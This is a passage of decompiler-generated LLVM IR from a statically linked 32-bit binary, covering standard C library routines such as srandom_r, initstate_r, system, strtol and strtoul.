  br label %dec_label_pc_805fbf9

dec_label_pc_805fbf9:                             ; preds = %dec_label_pc_805fbb6, %dec_label_pc_805fbf4
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_805fbfb = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805fbfb, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_805fbc1, { 1, 0 }
  uselistorder i32 %tmp2, { 0, 1, 2, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_805fbf9, { 1, 0 }
  uselistorder label %dec_label_pc_805fbf4, { 2, 0, 1 }
}

define i32 @srandom_r(i64 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-40 = alloca i64, align 8
  %v0_805fc00 = load i32, i32* @ebp, align 4
  %v0_805fc01 = load i32, i32* @edi, align 4
  %v0_805fc02 = load i32, i32* @esi, align 4
  %v0_805fc03 = load i32, i32* @ebx, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %arg2, i32* @esi, align 4
  %v4_805fc0e = trunc i64 %arg1 to i32
  store i32 %v4_805fc0e, i32* %eax.global-to-local, align 4
  %v1_805fc12 = add i32 %arg2, 12
  %v2_805fc12 = inttoptr i32 %v1_805fc12 to i32*
  %v3_805fc12 = load i32, i32* %v2_805fc12, align 4
  store i32 %v3_805fc12, i32* %edx.global-to-local, align 4
  %v6_805fc18 = icmp ugt i32 %v3_805fc12, 4
  br i1 %v6_805fc18, label %dec_label_pc_805fc8c, label %dec_label_pc_805fc1a

dec_label_pc_805fc1a:                             ; preds = %entry
  %v1_805fc1a = add i32 %arg2, 8
  %v2_805fc1a = inttoptr i32 %v1_805fc1a to i32*
  %v3_805fc1a = load i32, i32* %v2_805fc1a, align 4
  store i32 %v3_805fc1a, i32* %ebx.global-to-local, align 4
  %v1_805fc1d = icmp eq i32 %v4_805fc0e, 0
  %v1_805fc1f = icmp eq i1 %v1_805fc1d, false
  br i1 %v1_805fc1f, label %dec_label_pc_805fc23, label %dec_label_pc_805fc21

dec_label_pc_805fc21:                             ; preds = %dec_label_pc_805fc1a
  %v1_805fc21 = and i32 %v4_805fc0e, -256
  %v2_805fc21 = or i32 %v1_805fc21, 1
  store i32 %v2_805fc21, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805fc23

dec_label_pc_805fc23:                             ; preds = %dec_label_pc_805fc1a, %dec_label_pc_805fc21
  %v0_805fc23 = phi i32 [ %v4_805fc0e, %dec_label_pc_805fc1a ], [ %v2_805fc21, %dec_label_pc_805fc21 ]
  %v2_805fc23 = inttoptr i32 %v3_805fc1a to i32*
  store i32 %v0_805fc23, i32* %v2_805fc23, align 4
  %v1_805fc25 = icmp eq i32 %v3_805fc12, 0
  br i1 %v1_805fc25, label %dec_label_pc_805fc8a, label %dec_label_pc_805fc29

dec_label_pc_805fc29:                             ; preds = %dec_label_pc_805fc23
  %v0_805fc29 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_805fc29, i32* %edx.global-to-local, align 4
  %v0_805fc2b = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_805fc2b, i32* %ecx.global-to-local, align 4
  %v0_805fc2d = load i32, i32* @esi, align 4
  %v1_805fc2d = add i32 %v0_805fc2d, 16
  %v2_805fc2d = inttoptr i32 %v1_805fc2d to i32*
  %v3_805fc2d = load i32, i32* %v2_805fc2d, align 4
  store i32 %v3_805fc2d, i32* %eax.global-to-local, align 4
  %v4_805fc35 = sext i32 %v3_805fc2d to i64
  store i64 %v4_805fc35, i64* %stack_var_-40, align 8
  %v5_805fc6730 = icmp sgt i32 %v3_805fc2d, 1
  br i1 %v5_805fc6730, label %dec_label_pc_805fc3a, label %dec_label_pc_805fc69

dec_label_pc_805fc3a:                             ; preds = %dec_label_pc_805fc29, %dec_label_pc_805fc3a.dec_label_pc_805fc3a_crit_edge
  %v0_805fc5e = phi i32 [ %v0_805fc5e.pre, %dec_label_pc_805fc3a.dec_label_pc_805fc3a_crit_edge ], [ %v0_805fc2b, %dec_label_pc_805fc29 ]
  %v0_805fc3a = phi i32 [ %v0_805fc3a.pre, %dec_label_pc_805fc3a.dec_label_pc_805fc3a_crit_edge ], [ %v0_805fc29, %dec_label_pc_805fc29 ]
  %v0_805fc6131 = phi i32 [ %v0_805fc64.pre, %dec_label_pc_805fc3a.dec_label_pc_805fc3a_crit_edge ], [ 1, %dec_label_pc_805fc29 ]
  %v1_805fc41 = ashr i32 %v0_805fc3a, 31
  %v2_805fc42 = zext i32 %v0_805fc3a to i64
  %v4_805fc42 = zext i32 %v1_805fc41 to i64
  %v5_805fc42 = mul nuw i64 %v4_805fc42, 4294967296
  %v6_805fc42 = or i64 %v5_805fc42, %v2_805fc42
  %v8_805fc42 = sdiv i64 %v6_805fc42, 127773
  %v9_805fc42 = trunc i64 %v8_805fc42 to i32
  %v10_805fc42 = srem i64 %v6_805fc42, 127773
  %v3_805fc48 = mul nsw i64 %v10_805fc42, 16807
  %v4_805fc48 = trunc i64 %v3_805fc48 to i32
  %v3_805fc4e = mul i32 %v9_805fc42, 2836
  store i32 %v3_805fc4e, i32* %eax.global-to-local, align 4
  %v2_805fc54 = sub i32 %v4_805fc48, %v3_805fc4e
  %v13_805fc54 = icmp slt i32 %v2_805fc54, 0
  %v1_805fc56 = icmp eq i1 %v13_805fc54, false
  %v1_805fc58 = add i32 %v2_805fc54, 2147483647
  %v2_805fc54.v1_805fc58 = select i1 %v1_805fc56, i32 %v2_805fc54, i32 %v1_805fc58
  store i32 %v2_805fc54.v1_805fc58, i32* %edx.global-to-local, align 4
  %v1_805fc5e = add i32 %v0_805fc5e, 4
  store i32 %v1_805fc5e, i32* %ecx.global-to-local, align 4
  %v1_805fc61 = add i32 %v0_805fc6131, 1
  store i32 %v1_805fc61, i32* @edi, align 4
  %v2_805fc62 = inttoptr i32 %v1_805fc5e to i32*
  store i32 %v2_805fc54.v1_805fc58, i32* %v2_805fc62, align 4
  %v0_805fc64.pre = load i32, i32* @edi, align 4
  %v3_805fc64.pre = load i64, i64* %stack_var_-40, align 8
  %extract.t12 = trunc i64 %v3_805fc64.pre to i32
  %v5_805fc67 = icmp slt i32 %v0_805fc64.pre, %extract.t12
  br i1 %v5_805fc67, label %dec_label_pc_805fc3a.dec_label_pc_805fc3a_crit_edge, label %dec_label_pc_805fc64.dec_label_pc_805fc69_crit_edge

dec_label_pc_805fc3a.dec_label_pc_805fc3a_crit_edge: ; preds = %dec_label_pc_805fc3a
  %v0_805fc3a.pre = load i32, i32* %edx.global-to-local, align 4
  %v0_805fc5e.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805fc3a

dec_label_pc_805fc64.dec_label_pc_805fc69_crit_edge: ; preds = %dec_label_pc_805fc3a
  %v0_805fc69.pre = load i32, i32* @esi, align 4
  %v0_805fc6c.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805fc69

dec_label_pc_805fc69:                             ; preds = %dec_label_pc_805fc64.dec_label_pc_805fc69_crit_edge, %dec_label_pc_805fc29
  %v0_805fc6c = phi i32 [ %v0_805fc6c.pre, %dec_label_pc_805fc64.dec_label_pc_805fc69_crit_edge ], [ %v0_805fc2b, %dec_label_pc_805fc29 ]
  %v0_805fc69 = phi i32 [ %v0_805fc69.pre, %dec_label_pc_805fc64.dec_label_pc_805fc69_crit_edge ], [ %v0_805fc2d, %dec_label_pc_805fc29 ]
  %v1_805fc69 = add i32 %v0_805fc69, 20
  %v2_805fc69 = inttoptr i32 %v1_805fc69 to i32*
  %v3_805fc69 = load i32, i32* %v2_805fc69, align 4
  store i32 %v3_805fc69, i32* %eax.global-to-local, align 4
  %v2_805fc6c = add i32 %v0_805fc69, 4
  %v3_805fc6c = inttoptr i32 %v2_805fc6c to i32*
  store i32 %v0_805fc6c, i32* %v3_805fc6c, align 4
  %v0_805fc6f = load i32, i32* %ebx.global-to-local, align 4
  %v1_805fc6f = load i32, i32* %eax.global-to-local, align 4
  %v2_805fc6f = mul i32 %v1_805fc6f, 4
  %v3_805fc6f = add i32 %v2_805fc6f, %v0_805fc6f
  store i32 %v3_805fc6f, i32* %eax.global-to-local, align 4
  %v1_805fc72 = load i32, i32* @esi, align 4
  %v2_805fc72 = inttoptr i32 %v1_805fc72 to i32*
  store i32 %v3_805fc6f, i32* %v2_805fc72, align 4
  %v3_805fc74 = load i64, i64* %stack_var_-40, align 8
  %v6_805fc74 = mul nsw i64 %v3_805fc74, 10
  %v7_805fc74 = trunc i64 %v6_805fc74 to i32
  %v2_805fc7a = ptrtoint i32* %stack_var_-20 to i32
  %v1_805fc8724 = add i32 %v7_805fc74, -1
  %v9_805fc8728 = icmp slt i32 %v1_805fc8724, 0
  store i32 %v1_805fc8724, i32* @ebx, align 4
  %v1_805fc8829 = icmp eq i1 %v9_805fc8728, false
  br i1 %v1_805fc8829, label %dec_label_pc_805fc7a, label %dec_label_pc_805fc8a

dec_label_pc_805fc7a:                             ; preds = %dec_label_pc_805fc69, %dec_label_pc_805fc7a
  store i32 %v2_805fc7a, i32* %eax.global-to-local, align 4
  %v0_805fc7f = load i32, i32* @esi, align 4
  %v2_805fc80 = inttoptr i32 %v0_805fc7f to i32*
  %v3_805fc80 = call i32 @__GI_random_r(i32* %v2_805fc80, i32 %v2_805fc7a)
  store i32 %v0_805fc7f, i32* %eax.global-to-local, align 4
  store i32 %v2_805fc7a, i32* %edx.global-to-local, align 4
  %v0_805fc87.pre = load i32, i32* @ebx, align 4
  %v1_805fc87 = add i32 %v0_805fc87.pre, -1
  %v9_805fc87 = icmp slt i32 %v1_805fc87, 0
  store i32 %v1_805fc87, i32* @ebx, align 4
  %v1_805fc88 = icmp eq i1 %v9_805fc87, false
  br i1 %v1_805fc88, label %dec_label_pc_805fc7a, label %dec_label_pc_805fc8a

dec_label_pc_805fc8a:                             ; preds = %dec_label_pc_805fc69, %dec_label_pc_805fc7a, %dec_label_pc_805fc23
  store i32 0, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805fc8c

dec_label_pc_805fc8c:                             ; preds = %entry, %dec_label_pc_805fc8a
  %v0_805fc8f = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_805fc8a ]
  store i32 %v0_805fc8f, i32* %eax.global-to-local, align 4
  store i32 %v0_805fc03, i32* @ebx, align 4
  store i32 %v0_805fc02, i32* @esi, align 4
  store i32 %v0_805fc01, i32* @edi, align 4
  store i32 %v0_805fc00, i32* @ebp, align 4
  ret i32 %v0_805fc8f

; uselistorder directives
  uselistorder i32 %v0_805fc8f, { 1, 0 }
  uselistorder i32 %v1_805fc87, { 1, 0 }
  uselistorder i32 %v0_805fc69, { 1, 0 }
  uselistorder i32 %v0_805fc64.pre, { 1, 0 }
  uselistorder i32 %v2_805fc54.v1_805fc58, { 1, 0 }
  uselistorder i32 %v0_805fc3a, { 1, 0 }
  uselistorder i32 %v0_805fc2b, { 1, 0, 2 }
  uselistorder i64* %stack_var_-40, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10 }
  uselistorder i64 127773, { 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805fc8c, { 1, 0 }
  uselistorder label %dec_label_pc_805fc8a, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805fc7a, { 1, 0 }
  uselistorder label %dec_label_pc_805fc3a, { 1, 0 }
  uselistorder label %dec_label_pc_805fc23, { 1, 0 }
}

define i32 @__GI_initstate_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg2 to i32
  %stack_var_-36 = alloca i32, align 4
  %v0_805fc96 = load i32, i32* @ebp, align 4
  %v0_805fc97 = load i32, i32* @edi, align 4
  %v0_805fc99 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  store i32 %tmp7, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %tmp17 = icmp ult i32 %arg3, 128
  br i1 %tmp17, label %dec_label_pc_805fcba, label %dec_label_pc_805fcae

dec_label_pc_805fcae:                             ; preds = %entry
  %v2_805fcae = icmp ult i32 %arg3, 256
  %v1_805fcb5 = select i1 %v2_805fcae, i32 5, i32 4
  store i32 %v1_805fcb5, i32* @ebx, align 4
  br label %dec_label_pc_805fcd0

dec_label_pc_805fcba:                             ; preds = %entry
  %v6_805fcbd = icmp ugt i32 %arg3, 31
  br i1 %v6_805fcbd, label %dec_label_pc_805fcc8, label %dec_label_pc_805fcbf

dec_label_pc_805fcbf:                             ; preds = %dec_label_pc_805fcba
  store i32 0, i32* @ebx, align 4
  %v6_805fcc4 = icmp ugt i32 %arg3, 7
  br i1 %v6_805fcc4, label %dec_label_pc_805fcd0, label %dec_label_pc_805fd20

dec_label_pc_805fcc8:                             ; preds = %dec_label_pc_805fcba
  %v2_805fcc8 = icmp ult i32 %arg3, 64
  %v1_805fccd = select i1 %v2_805fcc8, i32 3, i32 2
  store i32 %v1_805fccd, i32* @ebx, align 4
  br label %dec_label_pc_805fcd0

dec_label_pc_805fcd0:                             ; preds = %dec_label_pc_805fcbf, %dec_label_pc_805fcae, %dec_label_pc_805fcc8
  %v0_805fcd0 = phi i32 [ 0, %dec_label_pc_805fcbf ], [ %v1_805fcb5, %dec_label_pc_805fcae ], [ %v1_805fccd, %dec_label_pc_805fcc8 ]
  %v1_805fcd0 = mul nuw nsw i32 %v0_805fcd0, 4
  %v2_805fcd0 = add i32 %v1_805fcd0, ptrtoint (i32* @global_var_806db14.794 to i32)
  %v3_805fcd0 = inttoptr i32 %v2_805fcd0 to i32*
  %v4_805fcd0 = load i32, i32* %v3_805fcd0, align 4
  store i32 %v4_805fcd0, i32* %eax.global-to-local, align 4
  %v1_805fcd7 = add i32 %tmp7, 4
  store i32 %v1_805fcd7, i32* @esi, align 4
  %v2_805fcda = add i32 %arg4, 16
  %v3_805fcda = inttoptr i32 %v2_805fcda to i32*
  store i32 %v4_805fcd0, i32* %v3_805fcda, align 4
  %v0_805fcdd = load i32, i32* @ebx, align 4
  %v1_805fcdd = mul i32 %v0_805fcdd, 4
  %v2_805fcdd = add i32 %v1_805fcdd, ptrtoint (i32* @global_var_806db00.795 to i32)
  %v3_805fcdd = inttoptr i32 %v2_805fcdd to i32*
  %v4_805fcdd = load i32, i32* %v3_805fcdd, align 4
  store i32 %v4_805fcdd, i32* %edx.global-to-local, align 4
  %v0_805fce4 = load i32, i32* @esi, align 4
  %v1_805fce4 = load i32, i32* %eax.global-to-local, align 4
  %v2_805fce4 = mul i32 %v1_805fce4, 4
  %v3_805fce4 = add i32 %v2_805fce4, %v0_805fce4
  store i32 %v3_805fce4, i32* %eax.global-to-local, align 4
  %v1_805fce7 = load i32, i32* @edi, align 4
  %v2_805fce7 = add i32 %v1_805fce7, 12
  %v3_805fce7 = inttoptr i32 %v2_805fce7 to i32*
  store i32 %v0_805fcdd, i32* %v3_805fce7, align 4
  %v0_805fcea = load i32, i32* %edx.global-to-local, align 4
  %v1_805fcea = load i32, i32* @edi, align 4
  %v2_805fcea = add i32 %v1_805fcea, 20
  %v3_805fcea = inttoptr i32 %v2_805fcea to i32*
  store i32 %v0_805fcea, i32* %v3_805fcea, align 4
  %v0_805fced = load i32, i32* %eax.global-to-local, align 4
  %v1_805fced = load i32, i32* @edi, align 4
  %v2_805fced = add i32 %v1_805fced, 24
  %v3_805fced = inttoptr i32 %v2_805fced to i32*
  store i32 %v0_805fced, i32* %v3_805fced, align 4
  %v0_805fcf0 = load i32, i32* @esi, align 4
  %v1_805fcf0 = load i32, i32* @edi, align 4
  %v2_805fcf0 = add i32 %v1_805fcf0, 8
  %v3_805fcf0 = inttoptr i32 %v2_805fcf0 to i32*
  store i32 %v0_805fcf0, i32* %v3_805fcf0, align 4
  %v0_805fcf3 = load i32, i32* @edi, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_805fcf8 = sext i32 %arg1 to i64
  %v3_805fcf8 = call i32 @srandom_r(i64 %v2_805fcf8, i32 %v0_805fcf3)
  %v0_805fcfd = load i32, i32* @ebp, align 4
  %v1_805fcfd = inttoptr i32 %v0_805fcfd to i32*
  store i32 0, i32* %v1_805fcfd, align 4
  %v2_805fd04 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_805fd04, i32* @ecx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_805fd08 = load i32, i32* @ebx, align 4
  %v1_805fd08 = icmp eq i32 %v0_805fd08, 0
  br i1 %v1_805fd08, label %dec_label_pc_805fd39, label %dec_label_pc_805fd0c

dec_label_pc_805fd0c:                             ; preds = %dec_label_pc_805fcd0
  %v0_805fd0c = load i32, i32* @edi, align 4
  %v1_805fd0c = add i32 %v0_805fd0c, 4
  %v2_805fd0c = inttoptr i32 %v1_805fd0c to i32*
  %v3_805fd0c = load i32, i32* %v2_805fd0c, align 4
  %v1_805fd0f = load i32, i32* @esi, align 4
  %v2_805fd0f = sub i32 %v3_805fd0c, %v1_805fd0f
  %v2_805fd11 = sdiv i32 %v2_805fd0f, 4
  %v3_805fd14 = mul i32 %v2_805fd11, 5
  %v2_805fd17 = add i32 %v3_805fd14, %v0_805fd08
  %v1_805fd19 = load i32, i32* @ebp, align 4
  %v2_805fd19 = inttoptr i32 %v1_805fd19 to i32*
  store i32 %v2_805fd17, i32* %v2_805fd19, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805fd39

dec_label_pc_805fd20:                             ; preds = %dec_label_pc_805fcbf
  %v1_805fd20 = call i32 @__errno_location(i32 %v0_805fc99)
  store i32 %v1_805fd20, i32* %eax.global-to-local, align 4
  %v1_805fd25 = inttoptr i32 %v1_805fd20 to i32*
  store i32 22, i32* %v1_805fd25, align 4
  %v0_805fd2b = load i32, i32* %stack_var_-36, align 4
  %v1_805fd2b = call i32 @__errno_location(i32 %v0_805fd2b)
  %v1_805fd30 = inttoptr i32 %v1_805fd2b to i32*
  store i32 22, i32* %v1_805fd30, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805fd39

dec_label_pc_805fd39:                             ; preds = %dec_label_pc_805fcd0, %dec_label_pc_805fd0c, %dec_label_pc_805fd20
  %v0_805fd40 = phi i32 [ 0, %dec_label_pc_805fcd0 ], [ 0, %dec_label_pc_805fd0c ], [ -1, %dec_label_pc_805fd20 ]
  store i32 %v0_805fc99, i32* @ebx, align 4
  store i32 %v0_805fc97, i32* @edi, align 4
  store i32 %v0_805fc96, i32* @ebp, align 4
  ret i32 %v0_805fd40

; uselistorder directives
  uselistorder i32* %eax.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8 }
  uselistorder i32 %arg3, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805fd39, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805fcd0, { 2, 0, 1 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v4_805fd4d = icmp eq i32 %arg1, 0
  br i1 %v4_805fd4d, label %dec_label_pc_805fe70, label %dec_label_pc_805fd58

dec_label_pc_805fd58:                             ; preds = %entry
  %v2_805fd5e = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 1, i32* @edx, align 4
  %v2_805fd6d = call i32 @__bsd_signal(i32 2, i32 1)
  store i32 2, i32* @ebx, align 4
  %v2_805fd7c = call i32 @__bsd_signal(i32 17, i32 0)
  %v1_805fd85 = call i32 @__vfork(i32 %v2_805fd7c)
  store i32 %v1_805fd85, i32* @ebx, align 4
  %v2_805fd8f = icmp slt i32 %v1_805fd85, 0
  %v2_805fd92 = icmp eq i1 %v2_805fd8f, false
  br i1 %v2_805fd92, label %dec_label_pc_805fdc3, label %dec_label_pc_805fd94

dec_label_pc_805fd94:                             ; preds = %dec_label_pc_805fd58
  %v2_805fd9c = call i32 @__bsd_signal(i32 3, i32 %v2_805fd5e)
  store i32 %v2_805fd5e, i32* @edx, align 4
  %v2_805fda9 = call i32 @__bsd_signal(i32 2, i32 %v2_805fd6d)
  store i32 2, i32* @ebx, align 4
  %v2_805fdb6 = call i32 @__bsd_signal(i32 17, i32 %v2_805fd7c)
  br label %dec_label_pc_805fe6d

dec_label_pc_805fdc3:                             ; preds = %dec_label_pc_805fd58
  %v1_805fd8f = icmp eq i32 %v1_805fd85, 0
  %v1_805fdc3 = icmp eq i1 %v1_805fd8f, false
  br i1 %v1_805fdc3, label %dec_label_pc_805fe0f, label %dec_label_pc_805fdc5

dec_label_pc_805fdc5:                             ; preds = %dec_label_pc_805fdc3
  %v2_805fdcb = call i32 @__bsd_signal(i32 3, i32 0)
  store i32 0, i32* @edx, align 4
  %v2_805fdd6 = call i32 @__bsd_signal(i32 2, i32 0)
  store i32 2, i32* @ebx, align 4
  %v2_805fde1 = call i32 @__bsd_signal(i32 17, i32 0)
  %v8_805fe00 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_806cbab.728 to i32), i32 ptrtoint ([3 x i8]* @global_var_806cbb0.727 to i32), i32 ptrtoint ([3 x i8]* @global_var_806cba8.726 to i32), i32 %arg1, i32 0)
  %v1_805fe0a = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_805fe0f:                             ; preds = %dec_label_pc_805fdc3
  %v2_805fe15 = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 1, i32* @edx, align 4
  %v2_805fe20 = call i32 @__bsd_signal(i32 2, i32 1)
  %v2_805fe25 = ptrtoint i32* %stack_var_-8 to i32
  %v0_805fe2e = load i32, i32* @ebx, align 4
  %v7_805fe2f = call i32 @wait4(i32 %v0_805fe2e, i32 %v2_805fe25, i32 0, i32 0)
  %v8_805fe37 = icmp eq i32 %v7_805fe2f, -1
  %v1_805fe38 = icmp eq i1 %v8_805fe37, false
  br i1 %v1_805fe38, label %dec_label_pc_805fe42, label %dec_label_pc_805fe3a

dec_label_pc_805fe3a:                             ; preds = %dec_label_pc_805fe0f
  store i32 -1, i32* %stack_var_-8, align 4
  br label %dec_label_pc_805fe42

dec_label_pc_805fe42:                             ; preds = %dec_label_pc_805fe0f, %dec_label_pc_805fe3a
  %v2_805fe4a = call i32 @__bsd_signal(i32 3, i32 %v2_805fd5e)
  store i32 3, i32* @ecx, align 4
  store i32 %v2_805fd5e, i32* @ebx, align 4
  %v2_805fe57 = call i32 @__bsd_signal(i32 2, i32 %v2_805fd6d)
  store i32 %v2_805fd6d, i32* @edx, align 4
  %v2_805fe64 = call i32 @__bsd_signal(i32 17, i32 %v2_805fd7c)
  %v3_805fe69 = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_805fe6d

dec_label_pc_805fe6d:                             ; preds = %dec_label_pc_805fd94, %dec_label_pc_805fe42
  %storemerge = phi i32 [ -1, %dec_label_pc_805fd94 ], [ %v3_805fe69, %dec_label_pc_805fe42 ]
  br label %dec_label_pc_805fe70

dec_label_pc_805fe70:                             ; preds = %entry, %dec_label_pc_805fe6d
  %v0_805fe74 = phi i32 [ 1, %entry ], [ %storemerge, %dec_label_pc_805fe6d ]
  ret i32 %v0_805fe74

; uselistorder directives
  uselistorder i32 %v1_805fd85, { 1, 2, 0 }
  uselistorder i32 %v2_805fd7c, { 1, 0, 2 }
  uselistorder i32 %v2_805fd6d, { 0, 2, 1 }
  uselistorder i32 %v2_805fd5e, { 1, 3, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @wait4, { 0, 1, 3, 2 }
  uselistorder i32 (i32, i32)* @__bsd_signal, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_805fe70, { 1, 0 }
  uselistorder label %dec_label_pc_805fe6d, { 1, 0 }
  uselistorder label %dec_label_pc_805fe42, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  %v3_805fe83 = call i32 @strtol(i32 %arg1)
  ret i32 %v3_805fe83

; uselistorder directives
  uselistorder i32 (i32)* @strtol, { 1, 0 }
}

define i32 @strtol(i32 %arg1) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %v4_805fe9d = inttoptr i32 %arg1 to i8*
  %v5_805fe9d = call i32 @_stdlib_strto_l(i8* %v4_805fe9d, i32 %tmp1, i32 %tmp2, i32 1)
  ret i32 %v5_805fe9d
}

define i32 @strtoul(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_805feb9 = inttoptr i32 %arg1 to i8*
  %v5_805feb9 = call i32 @_stdlib_strto_l(i8* %v4_805feb9, i32 %arg2, i32 %arg3, i32 0)
  ret i32 %v5_805feb9
}

define i32 @_stdlib_strto_l(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-16 = alloca i32, align 4
  %v0_805fec7 = load i32, i32* @ebx, align 4
  store i32 %v0_805fec7, i32* %stack_var_-16, align 4
  %v0_805fecb = load i32, i32* @global_var_8073fcc, align 4
  %v4_805fed1 = ptrtoint i8* %arg1 to i32
  store i32 %v4_805fed1, i32* @ecx, align 4
  store i32 %arg3, i32* %esi.global-to-local, align 4
  store i32 %v4_805fed1, i32* %ebx.global-to-local, align 4
  %v2_805fede40 = load i8, i8* %arg1, align 1
  %v3_805fede41 = sext i8 %v2_805fede40 to i32
  store i32 %v3_805fede41, i32* %eax.global-to-local, align 4
  %v2_805fee142 = mul nsw i32 %v3_805fede41, 2
  %v3_805fee143 = add i32 %v2_805fee142, %v0_805fecb
  %v4_805fee144 = inttoptr i32 %v3_805fee143 to i8*
  %v5_805fee145 = load i8, i8* %v4_805fee144, align 1
  %v6_805fee146 = and i8 %v5_805fee145, 32
  %v7_805fee147 = icmp eq i8 %v6_805fee146, 0
  %v1_805fee548 = icmp eq i1 %v7_805fee147, false
  br i1 %v1_805fee548, label %dec_label_pc_805fedd, label %dec_label_pc_805fee7

dec_label_pc_805fedd:                             ; preds = %entry, %dec_label_pc_805fedd
  %v0_805fedd49 = phi i32 [ %v1_805fedd, %dec_label_pc_805fedd ], [ %v4_805fed1, %entry ]
  %v1_805fedd = add i32 %v0_805fedd49, 1
  store i32 %v1_805fedd, i32* %ebx.global-to-local, align 4
  %v1_805fede = inttoptr i32 %v1_805fedd to i8*
  %v2_805fede = load i8, i8* %v1_805fede, align 1
  %v3_805fede = sext i8 %v2_805fede to i32
  store i32 %v3_805fede, i32* %eax.global-to-local, align 4
  %v2_805fee1 = mul nsw i32 %v3_805fede, 2
  %v3_805fee1 = add i32 %v2_805fee1, %v0_805fecb
  %v4_805fee1 = inttoptr i32 %v3_805fee1 to i8*
  %v5_805fee1 = load i8, i8* %v4_805fee1, align 1
  %v6_805fee1 = and i8 %v5_805fee1, 32
  %v7_805fee1 = icmp eq i8 %v6_805fee1, 0
  %v1_805fee5 = icmp eq i1 %v7_805fee1, false
  br i1 %v1_805fee5, label %dec_label_pc_805fedd, label %dec_label_pc_805fee7

dec_label_pc_805fee7:                             ; preds = %dec_label_pc_805fedd, %entry
  %v0_805fedd.lcssa = phi i32 [ %v4_805fed1, %entry ], [ %v1_805fedd, %dec_label_pc_805fedd ]
  %v2_805fede.lcssa = phi i8 [ %v2_805fede40, %entry ], [ %v2_805fede, %dec_label_pc_805fedd ]
  %v3_805fede.lcssa = phi i32 [ %v3_805fede41, %entry ], [ %v3_805fede, %dec_label_pc_805fedd ]
  %tmp36 = trunc i32 %arg4 to i8
  %v9_805fee7 = icmp eq i8 %v2_805fede.lcssa, 43
  br i1 %v9_805fee7, label %dec_label_pc_805fefc, label %dec_label_pc_805feec

dec_label_pc_805feec:                             ; preds = %dec_label_pc_805fee7
  store i32 0, i32* %ebp.global-to-local, align 4
  %v9_805feee = icmp eq i8 %v2_805fede.lcssa, 45
  %v1_805fef1 = icmp eq i1 %v9_805feee, false
  br i1 %v1_805fef1, label %dec_label_pc_805fefd, label %dec_label_pc_805fefc

dec_label_pc_805fefc:                             ; preds = %dec_label_pc_805fee7, %dec_label_pc_805feec
  %storemerge2 = phi i32 [ 1, %dec_label_pc_805feec ], [ 0, %dec_label_pc_805fee7 ]
  store i32 %storemerge2, i32* %ebp.global-to-local, align 4
  %v1_805fefc = add i32 %v0_805fedd.lcssa, 1
  store i32 %v1_805fefc, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805fefd

dec_label_pc_805fefd:                             ; preds = %dec_label_pc_805feec, %dec_label_pc_805fefc
  %v0_805ff0f = phi i32 [ %v0_805fedd.lcssa, %dec_label_pc_805feec ], [ %v1_805fefc, %dec_label_pc_805fefc ]
  %v1_805feff = and i32 %arg3, -17
  %v2_805feff = icmp eq i32 %v1_805feff, 0
  %v1_805ff05 = icmp eq i1 %v2_805feff, false
